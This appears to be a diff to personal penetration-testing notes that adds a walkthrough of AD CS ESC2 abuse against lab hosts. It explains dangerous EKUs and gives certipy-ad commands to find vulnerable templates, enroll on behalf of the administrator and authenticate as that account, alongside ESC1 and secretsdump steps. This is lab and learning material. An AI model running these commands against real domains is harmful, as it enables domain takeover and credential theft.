@@ -73,6 +73,8 @@ impacket-secretsdump -k -no-pass dc01.shadow.gate
 ```bash
 certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'Custom_ESC1' -upn 'administrator@papa.local'
 ```
+<img width="1083" height="335" alt="image" src="https://github.com/user-attachments/assets/8c555bb5-1b25-4145-af0b-ad2fa6c62dc3" />
+
 - Authenticating as Administrator to get ntlm hash or ticket-:
 
 ```bash
@@ -91,14 +93,45 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.130.136
 
 ------------------
 
-- 
+- ESC2 (Escalation Path 2) is a vulnerability in Active Directory Certificate Services (AD CS) where a certificate template allows low-privileged users to enroll, and the template includes dangerous Extended Key Usages (EKUs) like:
 
--------------------
+ - Client Authentication (1.3.6.1.5.5.7.3.2)
+ - Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
+ - Any Purpose (2.5.29.37.0)
+- These EKUs enable the attacker to request a certificate and authenticate as a different user via Kerberos (PKINIT), bypassing passwords entirely. 
+
+- Run the `certipy-ad find`
+- Grep for "ESC2" and spot the necessary `ANY PURPOSE` detail and also `domain users` for enrollment rights-:
+
+<img width="1038" height="965" alt="image" src="https://github.com/user-attachments/assets/d2885e45-0bd4-43d3-933a-ed71351243a8" />
+
+- Request certificate for your own user `dev`-:
+
+```bash
+certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136  -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'ESC2'
+```
+<img width="1408" height="301" alt="image" src="https://github.com/user-attachments/assets/8dbb1c16-5308-4915-a693-dcf2fd06174a" />
+
+- Request for administrator next-:
+
+```bash
+certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136  -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'User' -on-behalf-of administrator -pfx dev.pfx
+```
+
+<img width="1660" height="322" alt="image" src="https://github.com/user-attachments/assets/7abe2697-2174-4f0e-a455-6681a7c4cb16" />
+
+- Authenticate again-:
+
+```bash
+certipy-ad auth -pfx administrator --dc-ip <ip>
+```
+<img width="1158" height="392" alt="image" src="https://github.com/user-attachments/assets/b2fd19d4-a13b-48b4-b902-aff34201f1fb" />
+
+-----------------------
 
 
 
-<img width="1083" height="335" alt="image" src="https://github.com/user-attachments/assets/8c555bb5-1b25-4145-af0b-ad2fa6c62dc3" />
 
 
-- 
+
 
